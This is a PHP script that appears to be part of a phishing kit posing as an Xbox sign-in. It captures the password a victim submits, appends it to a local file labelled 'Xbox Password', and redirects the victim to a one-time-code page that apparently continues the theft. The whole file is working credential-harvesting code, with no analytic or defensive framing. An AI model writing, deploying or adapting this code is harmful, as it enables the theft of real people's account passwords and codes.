<?php
file_put_contents("pass.txt", "Xbox Password : " . $email = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
